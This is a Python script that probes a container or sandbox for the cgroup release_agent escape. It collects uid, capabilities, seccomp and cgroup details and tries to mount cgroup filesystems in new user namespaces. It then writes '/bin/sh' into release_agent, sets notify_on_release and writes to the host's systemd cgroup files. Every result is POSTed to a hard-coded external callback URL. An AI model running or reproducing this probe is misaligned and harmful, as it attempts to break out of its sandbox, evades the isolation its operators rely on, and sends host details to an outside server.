#!/usr/bin/env python3
import base64, json, os, pathlib, subprocess, time, urllib.request

SINK='https://54.209.51.244.sslip.io/callback/snapgpt-cgroup-release-agent-basic2-20261106'
out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'tests':{}}

def run(name, script, timeout=30):
    try:
        p=subprocess.run(['sh','-c',script],capture_output=True,text=True,timeout=timeout)
        out['tests'][name]={'rc':p.returncode,'stdout':p.stdout[-20000:],'stderr':p.stderr[-10000:]}
    except Exception as e:
        out['tests'][name]={'error':repr(e)}

run('identity', r'''id; cat /proc/self/status | grep -E '^(Uid|Gid|Cap|NoNewPrivs|Seccomp)'; cat /proc/self/cgroup; cat /proc/self/mountinfo | grep -E 'cgroup|/sys/fs/cgroup' ''')
run('systemd_mount', r'''ls -la /sys/fs/cgroup/systemd; for f in release_agent notify_on_release cgroup.procs tasks; do echo ===$f; stat -c '%A %U:%G %s' /sys/fs/cgroup/systemd/$f 2>&1; cat /sys/fs/cgroup/systemd/$f 2>&1 | head -20; done''')
run('userns_cgroupns_mount_v1', r'''rm -rf /tmp/cgv1; mkdir -p /tmp/cgv1; unshare -Ur -C -m --propagation private sh -c 'echo ID=$(id -u):$(id -g); cat /proc/self/cgroup; mount -t cgroup -o none,name=x cgroup /tmp/cgv1; echo mount_rc=$?; ls -la /tmp/cgv1; printf /bin/sh > /tmp/cgv1/release_agent; echo write_rc=$?; cat /tmp/cgv1/release_agent; printf 1 > /tmp/cgv1/notify_on_release; echo notify_rc=$?' 2>&1''')
run('userns_cgroupns_mount_v2', r'''rm -rf /tmp/cgv2; mkdir -p /tmp/cgv2; unshare -Ur -C -m --propagation private sh -c 'mount -t cgroup2 none /tmp/cgv2; echo mount_rc=$?; ls -la /tmp/cgv2 | head; cat /tmp/cgv2/cgroup.controllers 2>&1; cat /tmp/cgv2/cgroup.procs 2>&1 | head' 2>&1''')
run('userns_bind_systemd', r'''rm -rf /tmp/cgb; mkdir -p /tmp/cgb; unshare -Ur -m --propagation private sh -c 'mount --bind /sys/fs/cgroup/systemd /tmp/cgb; echo bind_rc=$?; mount -o remount,rw,bind /tmp/cgb; echo remount_rc=$?; ls -la /tmp/cgb | head; printf /bin/sh > /tmp/cgb/release_agent; echo write_rc=$?; cat /tmp/cgb/release_agent 2>&1' 2>&1''')
run('existing_mount_writes', r'''for f in /sys/fs/cgroup/systemd/notify_on_release /sys/fs/cgroup/systemd/cgroup.procs /sys/fs/cgroup/systemd/tasks; do echo ===$f; printf 1 >> $f 2>&1; echo rc=$?; done''')

payload=json.dumps(out,sort_keys=True,separators=(',',':')).encode()
req=urllib.request.Request(SINK,data=payload,method='POST',headers={'Content-Type':'application/json'})
try:
    with urllib.request.urlopen(req,timeout=30) as r:
        out['sink']={'status':r.status,'body':r.read().decode('utf-8','replace')[:1000]}
except Exception as e:
    out['sink']={'error':repr(e)}
print(json.dumps(out,sort_keys=True,separators=(',',':')))
